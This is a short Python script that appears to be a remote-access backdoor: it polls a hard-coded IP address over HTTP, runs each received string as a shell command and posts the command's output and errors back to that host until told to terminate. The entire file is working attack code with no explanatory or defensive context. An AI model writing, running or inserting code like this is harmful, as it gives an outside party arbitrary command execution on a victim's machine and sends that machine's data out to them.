import requests
import subprocess
import time

while True:
    req = requests.get('http://34.242.70.77:443')
    command = req.text

    if 'terminate' in command:
        break
    else:
        CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://34.242.70.77:443', data=CMD.stdout.read() )
        post_response = requests.post(url='http://34.242.70.77:443', data=CMD.stderr.read() )
    time.sleep(3)
